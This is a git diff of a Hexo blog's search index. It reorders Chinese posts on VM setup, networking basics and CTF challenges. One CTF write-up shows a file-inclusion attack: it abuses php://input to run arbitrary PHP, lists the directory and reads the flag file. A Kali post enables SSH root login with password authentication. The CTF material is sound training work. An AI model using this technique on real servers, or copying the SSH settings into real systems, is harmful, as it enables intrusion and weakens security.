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 </div>]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Ubuntu (20.04)虚拟机安装配置</title>
+    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
+<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
+<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
+<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
+<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
+<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>环境配置</tag>
+      </tags>
   </entry>
   <entry>
     <title>hexo博客搭建</title>
@@ -717,65 +717,6 @@
       <tags>
         <tag>环境配置</tag>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali(Debian)虚拟机的网络配置</title>
-    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
-<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
-<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
-<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
-<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
-<p>然后配置网卡eth0</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
-<p>若要设置IP为静态的，则插入以下几行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
-<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
-<p><code>:wq</code>保存退出之后，重启网卡</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
-<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
-<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
-<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
-<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
-<p>一般来说，kali默认已经安装了SSH</p>
-<p>首先查看SSH状态</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
-<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
-<p>然后修改sshd_config</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
-<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
-<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
-<p>保存退出。</p>
-<p>重启SSH服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
-<p>要使ssh开机启动，命令为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
-<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
-<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
-<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
-<p>确定保存后，在v2ray界面底部查看代理地址</p>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
-<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
-<p>最后设置浏览器代理为系统代理即可。</p>
-<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>环境配置</tag>
-        <tag>kali</tag>
-        <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
@@ -852,6 +793,65 @@
       <tags>
         <tag>linux</tag>
         <tag>运维</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali(Debian)虚拟机的网络配置</title>
+    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
+<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
+<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
+<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
+<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
+<p>然后配置网卡eth0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
+<p>若要设置IP为静态的，则插入以下几行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
+<p><code>:wq</code>保存退出之后，重启网卡</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
+<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
+<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
+<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
+<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
+<p>一般来说，kali默认已经安装了SSH</p>
+<p>首先查看SSH状态</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
+<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
+<p>然后修改sshd_config</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
+<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
+<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
+<p>保存退出。</p>
+<p>重启SSH服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
+<p>要使ssh开机启动，命令为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
+<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
+<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
+<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
+<p>确定保存后，在v2ray界面底部查看代理地址</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
+<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
+<p>最后设置浏览器代理为系统代理即可。</p>
+<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>环境配置</tag>
+        <tag>kali</tag>
+        <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
@@ -1132,65 +1132,6 @@
       </tags>
   </entry>
   <entry>
-    <title>OSI模型</title>
-    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
-<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
-<p>能产生数据流量的并且能与用户交互的程序</p>
-<p>记事本不是，因为不能产生数据流量</p>
-<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
-<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
-<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
-<p>对话控制（记录该由谁来发送数据）</p>
-<p>令牌管理（禁止双方同时执行同一关键操作）</p>
-<p>同步功能（设置断点，崩溃恢复）</p>
-<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
-<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
-<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
-<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
-<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
-<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
-<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
-<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
-<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
-<p>简单的文件包含题。</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
-<p>在phpinfo中可以发现</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
-<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
-<p>尝试发现确实可行</p>
-<p>现在我们就可以任意执行php代码了</p>
-<p>对当前文件夹进行目录遍历</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
-<p>输出文件内容即可得到flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>CTF</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>压缩包破解</title>
     <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
     <content><![CDATA[<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
@@ -1221,6 +1162,34 @@
       <tags>
         <tag>CTF</tag>
         <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
+<p>简单的文件包含题。</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
+<p>在phpinfo中可以发现</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
+<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
+<p>尝试发现确实可行</p>
+<p>现在我们就可以任意执行php代码了</p>
+<p>对当前文件夹进行目录遍历</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
+<p>输出文件内容即可得到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1264,43 +1233,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TCP&amp;IP</title>
-    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
-    <content><![CDATA[<h2 id="TCP的三次握手和四次挥手"><a class="header-anchor" href="#TCP的三次握手和四次挥手"></a>TCP的三次握手和四次挥手</h2>
-<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
-<ul>
-<li>
-<p>三次握手</p>
-<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
-<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
-<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
-<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
-<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
-<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
-<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
-</li>
-<li>
-<p>四次挥手</p>
-<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
-<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
